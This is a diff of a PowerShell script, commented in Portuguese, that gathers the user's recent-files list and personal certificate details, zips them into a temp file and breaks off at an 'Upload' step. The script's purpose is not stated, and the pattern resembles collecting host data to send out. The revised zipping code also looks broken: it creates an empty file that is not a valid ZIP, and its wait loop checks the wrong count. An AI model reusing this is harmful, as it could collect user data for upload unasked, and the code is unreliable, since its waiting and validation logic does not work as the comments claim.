@@ -24,19 +24,42 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 # 3) Certificados
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
+
+# ---- descarrega todos os handles ----
+$shell   = $null
+$zipFile = $null
+[GC]::Collect()
+[GC]::WaitForPendingFinalizers()
+
+
 # 4) ZIP sem compressão – garantido
-$zip="$env:TEMP\k.zip"
+$zip = "$env:TEMP\k.zip"
 if(Test-Path $zip){Remove-Item $zip -Force}
-$shell=New-Object -ComObject Shell.Application
-$zipFile=$shell.NameSpace($zip)
-# copia tudo
-Get-ChildItem $kit |%{$zipFile.CopyHere($_.FullName,4)}
-# aguarda terminar
-while($zipFile.Items().Count -ne (Get-ChildItem $kit).Count){Start-Sleep -m 500}
-# confere
-if((Get-childitem $kit).Count -ne $zipFile.Items().Count){
-  Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
+
+# ---- força flush em tudo que ainda possa estar em memória ----
+[GC]::Collect()
+[GC]::WaitForPendingFinalizers()
+
+# ---- cria o arquivo ZIP vazio antes de abrir com Shell ----
+Set-Content -Path $zip -Value ([byte[]]@()) -Encoding Byte -NoNewline
+
+$shell   = New-Object -ComObject Shell.Application
+$zipFile = $shell.NameSpace($zip)
+
+# ---- copia item a item, aguardando cada um terminar ----
+Get-ChildItem $kit | ForEach-Object {
+    $zipFile.CopyHere($_.FullName, 4 + 16)   # 4 = não exibir progresso, 16 = responder "Sim para Todos"
+    # aguarda o shell registrar a inclusão
+    do { Start-Sleep -m 200 } while (
+        $zipFile.Items().Count -lt (Get-ChildItem $zip).Count
+    )
 }
+
+# ---- validação final ----
+if((Get-ChildItem $kit).Count -ne $zipFile.Items().Count){
+    Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
+}
+
 
 # 5) Upload
 $file=Get-Item $zip
